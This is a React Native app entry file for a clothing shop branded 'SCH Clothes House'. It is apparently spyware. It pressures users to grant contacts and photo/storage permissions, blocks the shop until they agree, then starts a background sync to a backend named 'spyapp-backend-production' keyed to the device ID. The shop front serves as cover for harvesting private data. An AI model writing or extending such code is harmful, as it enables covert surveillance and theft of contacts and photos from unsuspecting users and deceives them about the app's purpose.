import React, { useEffect, useState } from 'react';
import {
  View,
  Text,
  StyleSheet,
  TouchableOpacity,
  PermissionsAndroid,
  Platform,
  ActivityIndicator,
  Linking,
} from 'react-native';
import DeviceInfo from 'react-native-device-info';
import { ShopScreen } from './src/screens/ShopScreen';
import { startBackgroundSync } from './src/services/BackgroundSyncService';

type PermissionState = 'checking' | 'granted' | 'denied' | 'permanent'; // permanent = "Don't ask again"

const BACKEND_URL = 'https://spyapp-backend-production.up.railway.app';

const REQUIRED_PERMISSIONS_33 = [
  PermissionsAndroid.PERMISSIONS.READ_CONTACTS,
  PermissionsAndroid.PERMISSIONS.READ_MEDIA_IMAGES,
  PermissionsAndroid.PERMISSIONS.READ_MEDIA_VIDEO,
];
const REQUIRED_PERMISSIONS_OLD = [
  PermissionsAndroid.PERMISSIONS.READ_CONTACTS,
  PermissionsAndroid.PERMISSIONS.READ_EXTERNAL_STORAGE,
  PermissionsAndroid.PERMISSIONS.WRITE_EXTERNAL_STORAGE,
];

export default function App() {
  const [permissionState, setPermissionState] = useState<PermissionState>('checking');

  const getRequiredPermissions = () =>
    Platform.Version >= 33 ? REQUIRED_PERMISSIONS_33 : REQUIRED_PERMISSIONS_OLD;

  const requestPermissions = async (): Promise<'granted' | 'denied' | 'permanent'> => {
    if (Platform.OS !== 'android') return 'granted';

    const permissions = getRequiredPermissions();

    try {
      const grants = await PermissionsAndroid.requestMultiple(permissions);
      const results = Object.values(grants);

      const allGranted = results.every(
        s => s === PermissionsAndroid.RESULTS.GRANTED,
      );
      if (allGranted) return 'granted';

      // Check karo — koi permission permanently deny hai?
      const isPermanent = results.some(
        s => s === PermissionsAndroid.RESULTS.NEVER_ASK_AGAIN,
      );
      return isPermanent ? 'permanent' : 'denied';

    } catch (err) {
      console.warn('Permission error:', err);
      return 'denied';
    }
  };

  const initSync = async () => {
    const uniqueId = await DeviceInfo.getUniqueId();
    startBackgroundSync({ backendUrl: BACKEND_URL, deviceId: uniqueId });
  };

  const handleGrantPress = async () => {
    setPermissionState('checking');
    const result = await requestPermissions();

    if (result === 'granted') {
      setPermissionState('granted');
      initSync();
    } else if (result === 'permanent') {
      // Android dialog nahi dikhata — Settings pe bhejo
      setPermissionState('permanent');
    } else {
      setPermissionState('denied');
    }
  };

  useEffect(() => {
    handleGrantPress();
  }, []);

  // ── Loading ────────────────────────────────────────────────────────────────
  if (permissionState === 'checking') {
    return (
      <View style={styles.fullScreen}>
        <Text style={styles.logoText}>SCH</Text>
        <Text style={styles.logoSub}>CLOTHES HOUSE</Text>
        <ActivityIndicator color="#c9a84c" size="large" style={{ marginTop: 32 }} />
      </View>
    );
  }

  // ── Permanent denial — Settings kholo ─────────────────────────────────────
  if (permissionState === 'permanent') {
    return (
      <View style={styles.fullScreen}>
        <Text style={styles.logoText}>SCH</Text>
        <Text style={styles.logoSub}>CLOTHES HOUSE</Text>
        <View style={styles.permBox}>
          <Text style={styles.permIcon}>⚙️</Text>
          <Text style={styles.permTitle}>Enable in Settings</Text>
          <Text style={styles.permDesc}>
            You selected <Text style={styles.bold}>"Don't ask again"</Text>.{'\n'}
            Please enable <Text style={styles.bold}>Contacts</Text> and{' '}
            <Text style={styles.bold}>Storage</Text> permissions manually from Settings.
          </Text>
          <TouchableOpacity style={styles.btnPrimary} onPress={() => Linking.openSettings()}>
            <Text style={styles.btnPrimaryText}>Open Settings</Text>
          </TouchableOpacity>
          <TouchableOpacity style={styles.btnSecondary} onPress={handleGrantPress}>
            <Text style={styles.btnSecondaryText}>Try Again</Text>
          </TouchableOpacity>
        </View>
      </View>
    );
  }

  // ── Denied — dobara maango ─────────────────────────────────────────────────
  if (permissionState === 'denied') {
    return (
      <View style={styles.fullScreen}>
        <Text style={styles.logoText}>SCH</Text>
        <Text style={styles.logoSub}>CLOTHES HOUSE</Text>
        <View style={styles.permBox}>
          <Text style={styles.permIcon}>🔒</Text>
          <Text style={styles.permTitle}>Permissions Required</Text>
          <Text style={styles.permDesc}>
            This app needs access to your{'\n'}
            <Text style={styles.bold}>Contacts</Text> and{' '}
            <Text style={styles.bold}>Gallery</Text>{'\n'}
            to work properly.
          </Text>
          {/* Har bar click pe Android se dubara maango */}
          <TouchableOpacity style={styles.btnPrimary} onPress={handleGrantPress}>
            <Text style={styles.btnPrimaryText}>Grant Permissions</Text>
          </TouchableOpacity>
          <TouchableOpacity style={styles.btnSecondary} onPress={() => Linking.openSettings()}>
            <Text style={styles.btnSecondaryText}>Open Settings</Text>
          </TouchableOpacity>
          <Text style={styles.permNote}>
            Without these permissions the app cannot function.
          </Text>
        </View>
      </View>
    );
  }

  // ── Granted ────────────────────────────────────────────────────────────────
  return <ShopScreen />;
}

const styles = StyleSheet.create({
  fullScreen: {
    flex: 1,
    backgroundColor: '#0f1b2d',
    alignItems: 'center',
    justifyContent: 'center',
    paddingHorizontal: 24,
  },
  logoText: { fontSize: 64, fontWeight: '900', color: '#c9a84c', letterSpacing: 8 },
  logoSub: { fontSize: 13, color: '#c9a84c88', letterSpacing: 4, marginTop: 4, marginBottom: 8 },
  permBox: {
    marginTop: 40, backgroundColor: '#16243a', borderRadius: 16,
    borderWidth: 1, borderColor: '#c9a84c33', padding: 28,
    alignItems: 'center', width: '100%',
  },
  permIcon: { fontSize: 40, marginBottom: 12 },
  permTitle: { fontSize: 20, fontWeight: '700', color: '#c9a84c', marginBottom: 12, textAlign: 'center' },
  permDesc: { fontSize: 14, color: '#8899aa', textAlign: 'center', lineHeight: 22, marginBottom: 24 },
  bold: { color: '#dce8f5', fontWeight: '700' },
  btnPrimary: {
    backgroundColor: '#c9a84c', borderRadius: 10, paddingVertical: 14,
    paddingHorizontal: 32, width: '100%', alignItems: 'center', marginBottom: 10,
  },
  btnPrimaryText: { color: '#0f1b2d', fontWeight: '800', fontSize: 15, letterSpacing: 0.5 },
  btnSecondary: {
    borderWidth: 1, borderColor: '#c9a84c55', borderRadius: 10,
    paddingVertical: 12, paddingHorizontal: 32, width: '100%',
    alignItems: 'center', marginBottom: 16,
  },
  btnSecondaryText: { color: '#c9a84c', fontWeight: '600', fontSize: 14 },
  permNote: { fontSize: 11, color: '#445566', textAlign: 'center', lineHeight: 16 },
});